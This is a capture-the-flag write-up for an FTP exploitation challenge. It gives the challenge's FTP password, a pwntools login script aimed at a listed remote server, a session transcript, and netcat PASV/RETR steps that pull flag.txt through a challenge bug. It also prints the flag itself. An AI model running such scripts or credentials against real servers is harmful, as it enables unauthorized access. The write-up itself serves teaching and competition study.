# Exploit 300 - ftp2

This challenge built off of Reversing300 (ftp) and which bspar solved using Z3. The password to the FTP service is `aDWX-|'`

Since this challenge reuses the Rev300 binary, you should already be familiar with how it looks in IDA.  So if IDA's not already open, go ahead and open it back up...just kidding!  After bspar shared the pass, I threw it into a pwntools script to check out what was going on once logged in.  Here is the script that I used:

```
#!/usr/bin/env python2

from pwn import *
import struct

local = True 	#true = remote, false = local

if local:
	p = process('./ftp_0319deb1c1c033af28613c57da686aa7')
	r = remote('localhost', 12012)
else:
	r = remote('54.175.183.202', 12012)

#context.log_level = 'debug'

print r.recv()
s = r.sendline("USER blankwall")
print r.recvline()
s = r.send("PASS aDWX-|'")
print r.recv()

s = r.interactive()
```
After running the script and logging in, you're presented with:
```
Welcome to FTP server
USER blankwall
Please send password for user blankwall
PASS aDWX-|'
logged in
HELP
USER PASS PASV PORT
NOOP REIN LIST SYST SIZE
RETR STOR PWD CWD
```
The first command I tried was LIST, but the FTP server stated that PASV was requirred first.  So let's type that in.
```
$ pasv
PASV succesful listening on port: 64128
```
Well it looks like the `PASV` command worked and the FTP server is now listening on the port listed.  Let's see if we can connect to it with netcat from another terminal after typing in `LIST`.
```
$ nc 54.172.10.117 63323
drwxr-xr-x 1     0     0         4096 Sep 20 05:22 ftp_0319deb1c1c033af28613c57da686aa7
drwxr-xr-x 1     0     0         4096 Sep 20 05:22 .bashrc
drwxr-xr-x 1     0     0         4096 Sep 20 05:22 .bash_history
drwxr-xr-x 1     0     0         4096 Sep 20 05:22 run.sh
drwxr-xr-x 1     0     0         4096 Sep 20 05:22 flag.txt
drwxr-xr-x 1     0     0         4096 Sep 20 05:22 .profile
drwxr-xr-x 1     0     0         4096 Sep 20 05:22 .bash_logout
drwxr-xr-x 1     0     0         4096 Sep 20 05:22 re_solution.txt
drwxr-xr-x 1     0     0         4096 0         4096  .selected_editor
```
Whoa, it worked!  And look, there's the `re_solution.txt` file that contains the flag for the Reversing300 challenge.  But wait, there's another file named `flag.txt`.  Could that the flag that we need be in here?  Let's find out!  

By now the FTP server will have most likely timed out, so log back in and setup another `PASV` port.  Once logged in type `RETR flag.txt`.  Switch over to the the other terminal that we used for netcat previously and this time enter `nc 54.172.10.117 63323`.  What all of this does is to setup the server to send the `flag.txt` file once we connect to it, and then the content of `flat.txt` will be displayed in our netcat session. 
We end up getting `flag{exploiting_ftp_servers_in_2015}`

Of course this is way too easy.  The challenge was supposed to prevent being able to directly retrieve the `flag.txt` file, but a bug prevented that from happening.
